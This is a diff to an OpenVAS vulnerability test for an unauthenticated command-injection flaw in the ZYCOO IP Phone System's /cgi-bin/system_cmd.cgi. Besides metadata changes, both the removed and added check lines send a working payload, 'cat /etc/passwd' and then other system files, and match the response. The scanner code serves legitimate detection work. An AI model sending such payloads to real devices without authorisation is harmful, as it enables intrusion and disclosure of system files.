@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_zycoo_ip_phone_system_rce_vuln.nasl 11614 2018-09-26 07:39:28Z asteins $
+# $Id: gb_zycoo_ip_phone_system_rce_vuln.nasl 11650 2018-09-27 10:32:13Z jschulte $
 #
 # ZYCOO IP Phone System Remote Code Execution Vulnerability
 #
@@ -30,8 +30,8 @@ CPE = 'cpe:/a:zycoo:ip_phone_system';
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106214");
-  script_version("$Revision: 11614 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-26 09:39:28 +0200 (Wed, 26 Sep 2018) $");
+  script_version("$Revision: 11650 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 12:32:13 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-08-29 16:16:40 +0700 (Mon, 29 Aug 2016)");
   script_tag(name:"cvss_base", value:"9.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");
@@ -52,10 +52,10 @@ if (description)
   script_tag(name:"summary", value:"ZYCOO IP Phone System is prone to a remote command execution vulnerability");
 
   script_tag(name:"insight", value:"The script /cgi-bin/system_cmd.cgi doesn't validate input which leads
-to remote command execution.");
+  to remote command execution.");
 
   script_tag(name:"impact", value:"An unauthenticated attacker can execute arbitrary OS commands which may
-lead to a complete compromise of the device.");
+  lead to a complete compromise of the device.");
 
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
@@ -71,16 +71,24 @@ lead to a complete compromise of the device.");
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
 
-url = "/cgi-bin/system_cmd.cgi?cmd='cat%20/etc/passwd'";
+files = traversal_files("linux");
 
-if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE)) {
-  report = report_vuln_url(port: port, url: url);
-  security_message(port: port, data: report);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url = "/cgi-bin/system_cmd.cgi?cmd='cat%20/" + file + "'";
+
+  if(http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
+    report = report_vuln_url(port: port, url: url);
+    security_message(port: port, data: report);
+    exit(0);
+  }
 }
 
-exit(0);
+exit(99);
